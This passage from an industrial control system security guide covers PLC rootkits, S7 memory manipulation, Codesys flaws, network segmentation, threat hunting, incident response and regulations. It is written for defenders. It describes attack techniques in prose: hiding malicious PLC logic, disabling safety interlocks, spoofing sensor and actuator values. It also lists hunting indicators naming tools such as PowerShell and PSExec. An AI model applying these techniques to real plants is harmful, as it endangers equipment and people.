PLC rootkits exploit the gap between the source-level representation (ladder logic, function block diagrams, structured text) and the compiled binary executing on the PLC's processor. The engineering tool displays the source; the PLC executes the binary. If an attacker modifies the binary without updating the source, the engineering tool shows the old, legitimate program while the PLC runs the attacker's modified version. Detection requires comparing the binary on the PLC with a known-good reference (a "golden image") — a hash comparison, not a source-code review.

**PLC program architecture exploitation.** Siemens S7 PLCs organize their programs into Organization Blocks (OBs), Function Blocks (FBs), Functions (FCs), and Data Blocks (DBs). OB1 is the main cyclic execution block — called every scan cycle (typically 1–100 ms). OB35 is the 100-ms cyclic interrupt. OB82 handles I/O access faults. OB121 handles programming errors. An attacker who adds a malicious FC (Function) and adds a call to it in OB1 inserts their code into every scan cycle. If the attacker also modifies the engineering tool's project file to hide the FC (removing it from the project's source tree while keeping it in the compiled binary on the PLC), the engineer reviewing the project in TIA Portal does not see the malicious function.

Practical PLC logic manipulation scenarios: modifying PID controller parameters (changing gain, integral time, or setpoint limits causes temperature/pressure/flow excursions that degrade product quality or stress equipment), disabling safety interlocks (removing the rung that trips on high-pressure, allowing pressure to exceed vessel rating), modifying recipe parameters in batch processes (changing ingredient ratios in pharmaceutical manufacturing — potentially producing adulterated product), modifying motor speed references (over-speeding a centrifuge or pump beyond its mechanical rating), and inserting time-bombs (logic that activates after a counter reaches a specific value, making the malicious behavior intermittent and harder to diagnose).

**Detection of PLC rootkits.** Hash-based golden image comparison is the primary detection method. Claroty's Platform calculates a fingerprint of the PLC's program binary and compares it against the approved version. Siemens' SINEC NMS provides PLC program version management. Open-source alternatives: using python-snap7 to periodically download the S7 program blocks, hash them with SHA-256, and compare against a stored reference. Any mismatch triggers investigation. The polling interval determines detection latency — a scan every 5 minutes limits the attacker's undetected window to 5 minutes.

### 4.5 Codesys V3 cross-vendor impact

Codesys V3 is a software PLC runtime licensed by over 500 industrial automation vendors (ABB, Beckhoff, Wago, Festo, Bosch Rexroth, Schneider Electric, Eaton, and many others). Vulnerabilities in the Codesys runtime affect all vendors using it — a single exploit potentially compromises PLCs from dozens of manufacturers.

The Codesys V3 runtime exposes multiple network services: the programming interface (TCP port 11740, used by the Codesys Development System IDE), a web server (HTTP, used for device status and diagnostics), an OPC UA server (for industrial data exchange), and a Gateway server (for routing connections to multiple Codesys devices). Each of these services has presented vulnerabilities.

CVE-2021-29240 through CVE-2021-29247 (Claroty, 2021): fifteen vulnerabilities including heap buffer overflows in the web server component, stack-based buffer overflows in the CmpApp and CmpTraceMgr components, and authentication bypass in the communication protocol. Collectively, these vulnerabilities allowed unauthenticated remote code execution on any Codesys V3 device accessible on the network.

CVE-2022-31806 (Forescout/Vedere Labs): the Codesys V3 runtime accepted unauthenticated connections to the programming interface by default — the authentication feature existed but was disabled in the default configuration. Combined with the programming interface's ability to upload arbitrary programs, this meant that any network-accessible Codesys-based PLC could be reprogrammed by an unauthenticated attacker.

### 4.6 PLC memory layout and direct manipulation

Understanding the PLC's memory layout is essential for both exploitation and detection. Siemens S7 PLCs organize memory into distinct areas:

**Input memory (I area).** Contains the current state of digital and analog inputs from field sensors. Read-only from the user program's perspective — the PLC firmware writes input values from the I/O modules at the beginning of each scan cycle. An attacker who writes to the I area (via S7comm write commands) can spoof sensor values — making the PLC's control logic behave as if a sensor is reading a different value than reality, without physically modifying the sensor.

**Output memory (Q area).** Contains the values that will be written to digital and analog outputs (actuators, valves, motors) at the end of each scan cycle. An attacker who writes directly to the Q area can command actuators regardless of the control logic's decisions — overriding the PLC's program and directly controlling the physical process.

**Marker memory (M area).** Internal flags and registers used by the control logic for intermediate calculations, state machines, and inter-block communication. Modifying markers can alter the PLC's internal logic state without changing the program code — a subtler attack than program modification.

**Data blocks (DB area).** Structured data storage used by function blocks. Data blocks contain setpoints, PID parameters, recipe data, alarm limits, and other configurable values. Modifying a DB that contains a PID controller's setpoint changes the controlled variable's target without modifying any program logic — the program still works correctly, but it controls to the wrong value.

**Timer and counter areas.** Modifying timers or counters can affect time-dependent logic: changing a timer's preset value can shorten or extend time-critical sequences (e.g., reducing the curing time in a chemical process, shortening a safety interlock delay).

Direct memory manipulation (writing to I/Q/M/DB areas via S7comm) is often more effective than program modification for process disruption. It requires less sophistication (no need to reverse-engineer the program structure), produces immediate physical effects, and is harder to detect with program-integrity-monitoring tools (the program hash doesn't change — only the data changes). Detection requires monitoring protocol-level write operations to sensitive memory areas and comparing written values against expected ranges.

---

## 5. ICS network architecture and segmentation

### 5.1 Purdue model implementation

The Purdue Enterprise Reference Architecture, codified in IEC 62443 (ISA/IEC 62443-3-3), defines hierarchical security zones for industrial networks. In practice, each level boundary is a firewall with explicit, deny-by-default rules.

**Level 0 (Physical Process).** Sensors, actuators, drives, valves — the devices that directly interact with the physical process. These devices communicate with Level 1 controllers via industrial field buses (4-20 mA analog, HART, Foundation Fieldbus, PROFIBUS PA, IO-Link). Security at Level 0 is primarily physical — tamper-resistant enclosures, locked electrical cabinets, and physical access controls to the process area.

**Level 1 (Basic Control).** PLCs, RTUs, safety controllers (SIS), and DCS controllers. These execute the control logic, reading sensor inputs from Level 0 and writing actuator outputs. Network protocols: Modbus RTU/TCP, EtherNet/IP, PROFINET, S7comm. Level 1 devices are the primary targets for ICS malware (Stuxnet, TRITON, PIPEDREAM). Network segmentation: each control system cell (a PLC and its associated I/O) should be in its own VLAN or network segment, with firewall rules restricting communication to only the necessary flows (e.g., the PLC communicates with its HMI at Level 2 on specific ports, not with PLCs in other cells).

**Level 2 (Area Supervisory Control).** HMIs (Human Machine Interfaces), engineering workstations, local historians, and operator workstations. These provide the human interface to the process — operators monitor the process, acknowledge alarms, and issue commands through the HMI. Engineering workstations provide programming and configuration access to Level 1 devices. Security: engineering workstations must have strict access controls (multi-factor authentication, privileged access management), application whitelisting (only approved engineering software executes), and network restrictions (engineering workstation access to Level 1 is controlled by firewall rules and is logged).

**Level 3 (Site Manufacturing Operations).** Site-wide services: central historian (OSIsoft PI, Wonderware/AVEVA Historian), domain controllers (if the OT network uses Active Directory), patch management servers (WSUS for OT), antivirus definition servers, and site-level applications (batch management, MES — Manufacturing Execution System). Level 3 aggregates data from multiple Level 2 systems and provides site-wide operational context.

**Level 3.5 (Industrial DMZ).** The critical boundary between OT (Levels 0-3) and IT (Levels 4-5). The DMZ contains: data diodes or unidirectional security gateways (for historian data replication from OT to IT without allowing any return traffic), jump servers (for controlled remote access from IT to OT — users authenticate to the jump server, and the jump server maintains the connection to OT; no direct IT-to-OT connectivity), and protocol break points (application-layer proxies that terminate one protocol and initiate another, preventing protocol-level attacks from crossing the boundary).

**Levels 4-5 (Enterprise IT).** Standard corporate IT infrastructure: email, ERP (SAP, Oracle), business intelligence, internet connectivity. No direct connectivity to Levels 0-3.

### 5.2 Data diodes and unidirectional gateways

Data diodes provide hardware-enforced unidirectional data flow — data can flow from OT to IT (for monitoring, historian replication, and analytics) but physically cannot flow from IT to OT. A true data diode uses a fiber-optic transmitter on the OT side and a receiver on the IT side, with no physical return path. Even if the IT side is completely compromised, the attacker cannot send any data back through the diode — the laws of physics prevent it (there is no optical receiver on the OT side).

**Waterfall Security** (now Tenable OT Security) and **Owl Cyber Defense** are the primary commercial data diode vendors. Their products provide: historian replication (mirroring PI or Wonderware data from the OT historian to an IT-side replica), file transfer (sending log files, reports, and engineering backups from OT to IT), and protocol-specific proxies (OPC UA, Modbus, DNP3, syslog — the proxy on the OT side reads the data, serializes it, transmits through the diode, and the proxy on the IT side reconstructs the protocol stream).

Data diodes have a significant operational limitation: they prevent any IT-to-OT communication. Remote access, remote engineering, remote patch deployment, and cloud-based monitoring all require bidirectional communication and are incompatible with a strict data diode architecture. Organizations must choose between the absolute security of a data diode and the operational flexibility of bidirectional (firewalled) connectivity. Many critical infrastructure operators deploy data diodes for historian replication (the highest-volume, most routine data flow) and firewalled jump servers for interactive remote access (lower frequency, more controlled).

### 5.3 Remote access to OT networks

Remote access to OT networks is a persistent tension between operational need (vendors need remote access for support, engineers need remote access for off-site troubleshooting) and security (every remote access path is a potential attack vector).

**VPN-based remote access.** The traditional approach: a VPN concentrator at the IT/OT boundary, with remote users authenticating via multi-factor authentication and receiving a VPN tunnel into the OT network. The VPN provides network-level access — once connected, the remote user has Layer 3 connectivity to the OT network segment. This is overly permissive: the remote user (or an attacker who compromises the VPN credentials) can reach any device on the OT network, not just the specific device they need to access.

**Privileged Access Management (PAM) for OT.** Solutions like CyberArk, Claroty xDome Secure Access, and Dispel provide session-based, least-privilege remote access. The remote user authenticates to the PAM platform (with MFA), requests access to a specific device, receives a time-limited session (recorded for audit), and the PAM platform proxies the connection — the remote user never has direct network access to the OT network. Sessions are recorded (screen recording, keystroke logging) for forensic review.

**Vendor remote access management.** ICS environments frequently require vendor remote access for support and maintenance — PLC vendors, SCADA software vendors, and system integrators need periodic access to diagnose issues and apply updates. Uncontrolled vendor access is a major risk vector: the Oldsmar water treatment attack used vendor remote access (TeamViewer) as the entry point, and many ICS incidents involve compromised vendor credentials.

Best practices for vendor remote access: dedicated vendor VPN accounts with MFA, time-limited access windows (access is enabled only during approved maintenance windows and disabled immediately after), session recording (all vendor sessions are recorded for audit), network segmentation (vendor access is restricted to the specific devices they support, not the entire OT network), and just-in-time access provisioning (vendor accounts are created for specific maintenance tasks and deactivated upon completion). Vendor access should never use shared credentials, and commercial remote desktop tools (TeamViewer, AnyDesk, LogMeIn) should be prohibited in favor of controlled, audited access platforms.

### 5.4 Historian placement and cross-zone data flow

The process historian (OSIsoft PI, AVEVA Historian, GE Proficy) collects process data from PLCs and DCS controllers, stores it in a time-series database, and provides it to applications across the organization (operations, maintenance, engineering, business analytics, regulatory reporting). The historian's placement is architecturally critical because it bridges multiple Purdue levels.

**Recommended architecture.** A primary historian server at Level 3 collects data directly from Level 1/2 control systems via ICS protocols (OPC DA/UA, Modbus). A secondary historian server (replica) at Level 4 or in the DMZ receives replicated data from the primary historian through a data diode or unidirectional gateway. IT-side applications (business analytics, ERP integration, cloud-based analytics) access the replica historian — never the primary. This architecture ensures that a compromise of the IT-side historian replica cannot propagate to the OT-side primary historian.

**Common misconfigurations.** A single historian server at Level 3 with direct IT-side connectivity (accessible from Level 4/5 for reporting) — this creates a direct, bidirectional path from IT to OT through the historian. Engineers or business users connecting directly to the OT historian from their corporate laptops — introducing uncontrolled devices to the OT network. Historian interfaces configured with anonymous or shared credentials — enabling unauthorized access to process data.

### 5.5 Flat OT networks — real-world failure modes

Many existing OT networks are flat — all devices (PLCs, HMIs, historians, engineering workstations, printers, and sometimes corporate IT devices) on the same Layer 2 network. Flat OT networks are the norm in brownfield installations (factories and utilities built before ICS cybersecurity was a concern) and in organizations that have not invested in OT network segmentation.

Flat OT networks enable: lateral movement (an attacker who compromises any device on the OT network can reach every other device), broadcast storm propagation (a malfunctioning device that floods the network with broadcast traffic affects all devices, potentially disrupting real-time control), GOOSE spoofing without segmentation barriers (in substations, a compromised device can inject GOOSE messages affecting all protection IEDs), and ARP spoofing for MITM (inserting between an HMI and a PLC to intercept and modify control commands in transit).

Remediation of flat OT networks is constrained by operational requirements: network changes risk disrupting real-time control, OT devices may not support VLANs or firewalling, and outage windows for network changes may be limited to annual maintenance shutdowns. Passive network monitoring (deploying IDS sensors on SPAN/mirror ports) provides visibility into flat networks without requiring architectural changes — a necessary first step before segmentation.

### 5.6 IEC 62443 zones and conduits

IEC 62443-3-2 defines the concept of security zones and conduits for OT network architecture. A **zone** is a grouping of assets (physical or logical) that share a common security requirement (Security Level). A **conduit** is the communication channel between zones — each conduit must have defined security controls (encryption, authentication, filtering) appropriate for the trust differential between the zones it connects.

Zone decomposition begins with asset inventory and function analysis: grouping devices by their function (control, safety, monitoring, engineering), criticality (what happens if this device is compromised or unavailable), and trust level (is this device fully trusted, partially trusted, or untrusted?). Each zone is assigned a Target Security Level (SL-T) based on the threat assessment and consequence analysis.

Practical zone decomposition for a typical manufacturing facility: Zone 1 (Safety System) — SIS controllers, safety I/O, safety engineering workstation — SL-T 3 or 4 (highest security, physically isolated). Zone 2 (Basic Process Control) — DCS/PLC controllers, process I/O — SL-T 2 or 3. Zone 3 (HMI and Supervision) — operator workstations, engineering workstations — SL-T 2. Zone 4 (Site Operations) — historian, domain controller, patch server — SL-T 2. Zone 5 (DMZ) — data diodes, jump servers, remote access gateways — SL-T 3. Zone 6 (Enterprise IT) — ERP, email, internet — SL-T 1 or 2.

The conduit between each pair of zones defines: allowed protocols (e.g., the conduit between Zone 2 and Zone 3 allows Modbus TCP and OPC UA but blocks S7comm engineering traffic, which is only allowed through Zone 3 → Zone 2 via the engineering workstation conduit), authentication requirements (e.g., the conduit from Zone 5 to Zone 3 requires MFA), and monitoring (all conduit traffic is logged and inspected by the ICS IDS).

---

## 6. ICS-specific detection and threat hunting

### 6.1 ICS network monitoring platforms

**Dragos Platform** provides protocol-level visibility into ICS networks. It passively monitors network traffic (via SPAN ports or network TAPs), decodes ICS protocols (Modbus, DNP3, S7comm, EtherNet/IP, IEC 104, GOOSE, FINS, BACnet), and applies threat analytics (behavioral baselines, signature-based detection, and Dragos's proprietary threat intelligence from tracking ICS-specific activity groups: CHERNOVITE, ELECTRUM, XENOTIME, KAMACITE, etc.).

**Claroty CTD (Continuous Threat Detection)** provides deep packet inspection for ICS protocols, asset discovery (automatically inventorying all OT devices and their firmware versions), vulnerability matching (correlating discovered assets with known CVEs), and anomaly detection. Claroty's Extended Detection and Response (xDR) integrates OT detections with IT security tools (SIEM, SOAR, EDR).

**Nozomi Networks Guardian** provides AI-based anomaly detection for OT networks, combining protocol analysis with machine-learning behavioral baselines. Nozomi's Threat Intelligence feed provides signatures for ICS-specific malware and TTPs.

### 6.2 Protocol-level anomaly detection

Effective ICS monitoring requires understanding what constitutes normal protocol behavior for the specific environment. Protocol-level anomalies that indicate potential attack activity include:

**Modbus anomalies:** Write Multiple Coils (function code 15) or Write Multiple Registers (function code 16) from a source that has never previously issued write commands (indicating a new or rogue device issuing control commands). Read operations from an unknown source (indicating reconnaissance). Function codes that the specific slave does not support (indicating fuzzing or exploitation attempts). Writes to registers that affect safety-critical setpoints (requiring higher scrutiny than writes to non-critical parameters).

**S7comm anomalies:** PLC Stop (0x29) or Program Download from a non-engineering-workstation IP address. Reading system state list (SZL) from an unknown source (reconnaissance for vulnerability identification). Unauthorized access to CPU protection level configuration. S7comm packet with a manipulated PDU reference (indicating ROGUE7-style MITM).

**IEC 104 anomalies:** Control commands (C_SC, C_DC, C_SE) from a non-SCADA-server IP address. Commands sent outside of operational hours. Commands targeting IOAs (Information Object Addresses) that have never been commanded previously. Rapid-fire commands (dozens of open/close commands per second — consistent with INDUSTROYER's automated attack sequence, inconsistent with human operator behavior).

### 6.3 PLC program integrity monitoring

PLC program integrity monitoring compares the program currently running on the PLC with a known-good reference. Methods:

**Hash-based comparison.** Download the PLC's program binary (via the engineering protocol — S7comm, EtherNet/IP, etc.), compute a cryptographic hash (SHA-256), and compare against the hash of the golden image (the verified, approved version of the program). Any mismatch indicates unauthorized modification. Limitations: downloading the program may require authentication (especially on newer PLCs with access protection), the download itself is detectable by the PLC's audit log, and the polling interval determines detection latency.

**Configuration management.** Maintaining a version-controlled repository of all PLC programs (using tools like Rockwell AssetCentre, Siemens SINEC NMS, or Verve Security Center). Any change to a PLC program is detected by comparing the current version with the version in the repository. Changes are cross-referenced with change management records — a PLC program change without a corresponding approved change request is a high-severity alert.

**Runtime memory monitoring.** Some ICS monitoring platforms (Claroty, Dragos) can monitor PLC memory areas in real time (by passively observing the data on the network, not by actively querying the PLC). Sudden changes to specific memory areas (the program block area, the system function block area) indicate program modification. This approach provides near-real-time detection without active polling.

### 6.4 Network baseline and behavioral analytics

ICS network traffic is significantly more deterministic than IT network traffic. PLCs communicate with HMIs and SCADA servers in predictable patterns: fixed polling intervals (an HMI reads PLC registers every 500 ms), fixed communication pairs (only specific HMIs communicate with specific PLCs), fixed protocol usage (a device that normally uses Modbus should never generate S7comm traffic), and fixed data volumes (a PLC that sends 100 bytes of data per poll should not suddenly send 10,000 bytes).

Behavioral analytics leverages this determinism: the ICS monitoring platform establishes a baseline of normal network behavior (communication pairs, protocols, timing, data volumes, command types) during a learning period (typically 2–4 weeks of observed traffic during normal operations). After baselining, any deviation from the established pattern generates an alert.

**Baseline deviations indicating compromise:** new communication pair (a device that has never communicated with a specific PLC begins sending commands — potential attacker lateral movement), new protocol (a device begins using a protocol it has never used — potential reconnaissance or exploitation tool), timing anomaly (polling interval changes, or commands are sent at unusual times — night shifts when no engineers should be active), command anomaly (a device that has only performed read operations begins performing writes — potential control manipulation), and volume anomaly (data transfer size increases dramatically — potential data exfiltration or large program upload).

**ICS-specific Snort/Suricata signatures.** Open-source IDS signatures for ICS protocols: the Quickdraw SCADA IDS Rules (Digital Bond) provide Snort signatures for Modbus, DNP3, EtherNet/IP, and other ICS protocols. These signatures detect: unauthorized function codes (Modbus writes from unauthorized sources, DNP3 unsolicited responses from unexpected outstations), protocol violations (malformed frames, invalid field values), and known attack patterns (INDUSTROYER IEC 104 command sequences, TRITON TriStation traffic).

### 6.5 OT threat hunting playbooks

OT threat hunting adapts IT threat hunting methodology to the ICS environment, with key differences: the threat landscape is dominated by a small number of known ICS-specific activity groups (tracked by Dragos, Mandiant, and CrowdStrike), the network protocols are different, and the consequences of false positives are different (triggering an unnecessary shutdown is itself a safety risk).

**Playbook: CHERNOVITE/PIPEDREAM.** Hunt for: Codesys V3 connections (TCP 11740) from non-engineering workstations, FINS protocol (UDP 9600) communication from unexpected sources, OPC UA discovery requests from unknown clients, and HTTP connections to PLC management interfaces from non-engineering IPs.

**Playbook: ELECTRUM/INDUSTROYER.** Hunt for: IEC 104 connections from non-SCADA servers, GOOSE messages from non-IED MAC addresses, OPC DA/DCOM connections from unexpected sources, and the specific IEC 104 command sequences (station interrogation followed by rapid-fire open commands) that characterize the INDUSTROYER attack pattern.

**Playbook: Engineering workstation compromise.** Hunt for: unusual process execution on engineering workstations (Python, PowerShell, unknown executables — engineering workstations should only run approved engineering software), network connections from engineering workstations to internet destinations, unusual file access patterns on engineering workstations (accessing PLC project files outside of maintenance windows), and lateral movement indicators (SMB/WMI/PSExec from the engineering workstation to other OT hosts).

**Playbook: FrostyGoop/Modbus abuse.** Hunt for: Modbus TCP connections (port 502) from non-SCADA IP addresses, Modbus Write commands (function codes 5, 6, 15, 16) from sources that typically only perform reads, writes to registers associated with safety-critical setpoints (requires knowledge of the specific PLC's register mapping), and Modbus connections from external network segments (internet-facing Modbus devices — check for any PLC or RTU with a routable IP address accessible from outside the OT network).

**Threat intelligence integration.** OT-specific threat intelligence from Dragos, Mandiant, and ICS-CERT provides: indicators of compromise (IoCs) for known ICS malware (file hashes, C2 IP addresses, Yara rules), behavioral indicators (TTPs mapped to ATT&CK for ICS), and vulnerability advisories specific to ICS vendors. Dragos tracks ICS activity groups by operational characteristics: ELECTRUM (INDUSTROYER), XENOTIME (TRITON), CHERNOVITE (PIPEDREAM), KAMACITE (BlackEnergy initial access), ERYTHRITE (credential theft targeting ICS environments). Intelligence-driven hunting: search network logs and endpoint telemetry for indicators associated with the activity groups most likely to target the organization's sector.

---

## 7. ICS incident response

### 7.1 Process safety considerations

ICS incident response differs fundamentally from IT incident response because the controlled process has physical safety implications. An IR team responding to an ICS compromise must coordinate with process engineers to ensure that any defensive actions (isolating network segments, shutting down compromised hosts, resetting PLCs) do not create unsafe process conditions.

The worst-case scenario: the IR team, attempting to contain a PLC compromise, disconnects the compromised PLC from the network. If the PLC was controlling a critical process function (e.g., a cooling system, a pressure relief controller), disconnecting it may cause the process to enter an unsafe state. The PLC's behavior when it loses network connectivity depends on its configuration: it may hold its last output values (potentially safe), go to a fail-safe state (predefined safe output values — the preferred configuration), or fault and stop all outputs (potentially dangerous if the process requires active control to remain safe).

IR teams must have pre-established coordination procedures with operations: the operations team provides the IR team with a list of safety-critical PLCs (PLCs that must not be disconnected or stopped without a concurrent manual shutdown of the process they control), the IR team provides the operations team with a list of potentially compromised devices, and together they determine the safest containment strategy.

### 7.2 PLC forensic acquisition

Forensic acquisition from a PLC is more limited than from a general-purpose computer. PLCs do not have file systems, event logs (in the IT sense), or user-accessible storage. Forensic artifacts from PLCs include:

**Program blocks.** Downloading the PLC's current program provides evidence of logic manipulation. The downloaded program is compared with the golden image to identify unauthorized modifications. The download must be performed using the engineering tool (TIA Portal, RSLogix, Unity Pro) or a protocol-specific script (using python-snap7 for S7comm, pycomm3 for EtherNet/IP).

**Diagnostic buffers.** Siemens S7 PLCs maintain a diagnostic buffer that records PLC events: mode changes (RUN → STOP → RUN), program downloads, firmware updates, hardware faults, and communication errors. The diagnostic buffer is circular (limited size), so events may have been overwritten. Downloading the diagnostic buffer provides a timeline of PLC events.

**Memory snapshots.** Reading the PLC's I/Q/M/DB memory areas provides a snapshot of the current process state and any data that the attacker's malicious logic may have stored in data blocks. Memory snapshots should be acquired before any remediation (which would overwrite the memory).

**Network packet captures.** SPAN/mirror port captures from the OT network during the incident period contain the actual protocol commands exchanged between the attacker's tools and the PLCs. Parsing these captures with ICS-protocol-aware tools (Wireshark with S7comm/Modbus/DNP3/IEC 104 dissectors, Claroty's protocol decoder, or Dragos's protocol analysis) reveals: which commands the attacker sent (reads, writes, program downloads, PLC state changes), which register addresses were targeted (identifying the specific process variables that were manipulated), and the timing of the attack sequence (correlating cyber commands with physical process effects).

**Engineering workstation forensics.** Windows-based engineering workstations are analyzed using standard IT forensics techniques (disk imaging, registry analysis, event log analysis, memory forensics) augmented with ICS-specific artifacts: PLC project files (examining the .s7p, .zap, or .acd project files for unauthorized modifications), engineering software logs (TIA Portal, RSLogix, Unity Pro maintain connection logs showing when the software connected to which PLC), and protocol-specific traces (some engineering tools maintain internal packet captures of PLC communications).

**SCADA/HMI event logs.** SCADA systems (Wonderware, FactoryTalk, SIMATIC WinCC) maintain event logs that record: operator actions (login, logout, command issuance), alarm events (process variables exceeding limits), and system events (communication errors, module failures). These logs, while not as detailed as a network packet capture, provide the operator-level view of the incident and are essential for understanding what the SCADA system showed the operators during the attack (which may differ from reality if the attacker manipulated the display values — as Stuxnet did).

### 7.3 Timeline reconstruction with historian data

The process historian (OSIsoft PI, AVEVA Historian, GE Proficy Historian) records process variables (temperatures, pressures, flows, valve positions, motor speeds) at regular intervals (typically 1-second to 1-minute intervals, with change-of-value and exception-based recording for faster transients). Historian data provides a detailed timeline of the physical process state before, during, and after the incident.

Historian-based timeline reconstruction: identify the time window of the incident (from network logs, PLC diagnostic buffer, and operator observations), extract historian data for all relevant process variables during that window, plot the process variables to identify anomalous excursions (unexpected changes in temperature, pressure, flow, or equipment state that correlate with the attacker's actions), and correlate process anomalies with network events (ICS protocol commands observed by the network monitoring system) to build a unified timeline of cyber actions and physical effects.

Historian data is forensic evidence: it should be preserved (the historian's database should be backed up before any remediation), its integrity should be verified (checking for gaps, alterations, or suspicious access patterns in the historian's audit log), and it should be analyzed for evidence of data manipulation (an attacker who compromises the historian could alter historical data to conceal their actions — similar to Stuxnet's technique of presenting pre-recorded "normal" data to the HMI).

### 7.4 Safe shutdown procedures during active compromise

When an active compromise is detected in the OT network and the IR team determines that the attacker may have the capability to manipulate the controlled process, a deliberate safe shutdown may be required. This is the most consequential decision in ICS incident response — shutting down a process has operational, financial, and potentially safety implications.

The safe shutdown decision tree: (1) Is the attacker in a position to manipulate process-critical controllers (PLCs controlling safety-critical functions)? If yes, proceed. (2) Can the process be safely maintained in its current state while containment is performed (isolating the attacker's access without changing the process)? If yes, contain first. (3) If the attacker has the demonstrated ability to change process parameters (observed writes to process-critical registers), initiate a controlled shutdown using manual procedures (not through the potentially compromised SCADA system).

Manual shutdown procedures bypass the compromised control system entirely: operators physically manipulate control elements (closing manual valves, pressing physical stop buttons, operating local control panels on the equipment). These procedures must be pre-documented, regularly practiced (tabletop and live drills), and accessible to operators without relying on digital systems that may be compromised.

### 7.5 Recovery and restoration

Recovery from an ICS compromise follows a different pattern than IT recovery. PLCs cannot be simply "reimaged" — they must be reprogrammed with the verified golden image, the program must be validated (comparing the downloaded program with the golden image hash), and the process must be restarted in a controlled manner (often requiring manual valve alignment, motor checks, and safety system verification before returning to automatic control).

**PLC reprogramming.** Using the engineering tool on a known-clean workstation (rebuilt from media, not the compromised workstation), download the golden-image program to each compromised PLC. Verify the download by reading back the program and comparing the hash. Test the PLC in a controlled mode (manual/supervised) before returning to automatic operation. For safety-critical PLCs (SIS controllers), the reprogramming must follow the facility's Management of Change (MOC) procedure and require the safety system's key switch to be in PROGRAM mode.

**HMI and engineering workstation rebuild.** Compromised Windows-based HMI and engineering workstations should be rebuilt from known-good media (OS image, engineering software installation). The PLC project files should be restored from the version-controlled repository. User accounts should be recreated with new credentials. Application whitelisting should be deployed to prevent unauthorized software execution.

**Network re-segmentation.** If the attacker entered through a segmentation weakness, the recovery must include network architecture improvements: implementing VLAN segmentation at the Purdue model boundaries, deploying industrial firewalls (Palo Alto OT Security, Fortinet FortiGate with ICS protocol inspection, Cisco ISA3000), deploying data diodes or unidirectional gateways at the IT/OT boundary, deploying network monitoring (Dragos, Claroty, Nozomi) to detect future intrusions, and implementing role-based access control for all engineering tool connections.

**Post-incident validation.** Before returning the process to normal operation: verify all PLC programs match their golden images (hash comparison), verify all HMI configurations match their backups, verify all network firewall rules are correctly configured, perform a functional test of the safety system (SIS trip test), verify that the historian is recording accurately, and monitor the network for any indicators of persistent attacker access (dormant backdoors, scheduled tasks, modified system services).

### 7.6 Lessons from Colonial Pipeline (2021)

While Colonial Pipeline was an IT ransomware incident (DarkSide ransomware encrypted the pipeline company's billing systems), the operational decision to shut down the pipeline's OT operations was driven by the inability to bill customers and the fear that the ransomware might spread to OT systems. The incident demonstrated that IT/OT convergence means IT incidents can have OT consequences — even without the attacker touching OT systems. The Colonial Pipeline shutdown caused fuel shortages across the southeastern United States for six days, demonstrating the cascading physical impact of cyber incidents on critical infrastructure.

The TSA Pipeline Security Directives issued in response (§8.3) mandated: OT network segmentation (isolating OT from IT so that an IT ransomware incident cannot reach OT systems), incident detection and response capability for OT networks, and a cybersecurity implementation plan reviewed annually. These directives transformed pipeline OT security from voluntary best practices to regulatory requirements with enforcement teeth.

---

## 8. Regulatory and compliance frameworks

### 8.1 IEC 62443 (ISA/IEC 62443)

IEC 62443 is the primary international standard for industrial automation and control system security. It defines four Security Levels (SL):

**SL 1 (Casual or coincidental violation).** Protection against unintentional or accidental compromise. Baseline controls: user authentication, role-based access control, communication integrity (checksums).

**SL 2 (Intentional violation using simple means).** Protection against intentional attack using commonly available tools and techniques. Additional controls: encrypted communication, intrusion detection, security monitoring, patch management.

**SL 3 (Intentional violation using sophisticated means).** Protection against sophisticated attackers with moderate resources. Additional controls: multi-factor authentication, application whitelisting, security information and event management (SIEM), incident response capability, and security architecture review.

**SL 4 (Intentional violation using sophisticated means with extended resources).** Protection against nation-state-level attackers — the TRITON, INDUSTROYER, and PIPEDREAM threat level. The highest level requires: advanced threat detection (ICS-specific IDS/IPS with protocol-aware deep packet inspection), security operations center (SOC) with OT expertise (analysts who understand ICS protocols, process control, and can distinguish between operational anomalies and cyber attacks), regular penetration testing (ICS-specific pentest methodology per IEC 62443-4-1, including PLC vulnerability scanning, protocol fuzzing, and network segmentation verification), hardware security (anti-tamper for field devices, secure boot for PLCs, hardware-based key storage), and supply chain security (vendor risk assessment, firmware integrity verification, hardware bill of materials tracking).

Achieving SL 4 is rare and expensive. Most critical infrastructure organizations target SL 2 or SL 3 for their process control zones, with SL 3 or SL 4 reserved for safety systems (SIS). The gap between the targeted Security Level and the achieved Security Level represents residual risk — documented in the organization's risk register and accepted by management.

IEC 62443-3-3 defines the specific technical requirements for each Security Level. IEC 62443-2-1 defines the security management system (policies, procedures, organization). IEC 62443-4-1 defines secure product development lifecycle requirements for ICS vendors. IEC 62443-4-2 defines technical security requirements for ICS components (PLCs, DCS controllers, safety systems).

### 8.2 NERC CIP

The North American Electric Reliability Corporation's Critical Infrastructure Protection (NERC CIP) standards are mandatory for the bulk electric system (BES) in North America. Key standards:

**CIP-002 (BES Cyber System Categorization).** Identifies and categorizes BES Cyber Systems as high, medium, or low impact based on the potential reliability impact of their compromise. A large generating station or a major transmission substation is high impact; a small generating facility is low impact.

**CIP-005 (Electronic Security Perimeters).** Requires electronic security perimeters (ESP) around BES Cyber Systems — network boundaries with firewall rules controlling all inbound and outbound traffic. Each ESP must have defined Electronic Access Points (EAPs) where traffic is monitored and controlled.

**CIP-007 (System Security Management).** Requires: port and service management (disabling unnecessary services), security patch management (within 35 days of evaluation for applicable patches), malicious code prevention (antivirus or application whitelisting), and security event monitoring (logging authentication events, security-relevant events, and retaining logs for 90 days).

**CIP-010 (Configuration Change Management).** Requires: baseline configurations for all BES Cyber Systems, change management processes (documenting, testing, and approving all changes), and vulnerability assessments (at least once every 15 months for high and medium impact systems).

NERC CIP violations carry significant penalties — up to $1,000,000 per violation per day, enforced by the Federal Energy Regulatory Commission (FERC).

### 8.3 Other frameworks

**NIST SP 800-82 (Guide to ICS Security).** Provides comprehensive guidance on ICS security: threat landscape, risk assessment, security architecture (based on the Purdue model), security controls (mapped to NIST SP 800-53), and incident response. SP 800-82 is advisory (not mandatory), but widely used as a reference for ICS security programs.

